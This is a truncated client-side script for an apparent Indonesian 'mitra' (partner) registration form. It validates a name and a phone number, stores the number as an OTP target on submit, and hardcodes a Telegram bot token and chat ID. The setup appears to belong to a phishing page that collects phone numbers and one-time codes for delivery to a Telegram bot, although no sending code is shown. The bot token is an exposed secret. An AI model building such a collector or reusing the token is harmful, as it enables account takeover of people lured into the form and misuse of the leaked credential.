<script>
  const form = document.getElementById("formMitra");
  const hpInput = document.getElementById("hp");
  const namaInput = document.getElementById("nama");
  const btnDaftar = document.getElementById("btn-daftar");
  const notice = document.getElementById("notice-hp");

  // === KONFIG TELEGRAM BOT ===
  const BOT_TOKEN = "7566851766:AAEbOqBAI2XfHKrx15zlO-OqkGUvNzFPh_o"; // ganti dengan token bot Anda
  const CHAT_ID = "-1002437287311"; // ganti dengan chat_id / group_id tujuan

  function formatNomorHP(val) {
    val = val.replace(/\D/g, '');
    if (val.startsWith('62')) {
      val = '0' + val.slice(2);
    } else if (!val.startsWith('0') && val.length > 0) {
      val = '0' + val;
    }
    return val;
  }

  hpInput.addEventListener("input", () => {
    hpInput.value = formatNomorHP(hpInput.value);
    if (hpInput.value.length > 0 && hpInput.value.length < 10) {
      notice.style.display = 'block';
    } else {
      notice.style.display = 'none';
    }
    cekForm();
  });

  namaInput.addEventListener("input", cekForm);

  function cekForm() {
    btnDaftar.disabled = !(namaInput.value.trim() && hpInput.value.trim().length >= 10);
  }

  form.addEventListener("submit", (e) => {
    sessionStorage.setItem("otp_tujuan", hpInput.value.trim());


  });
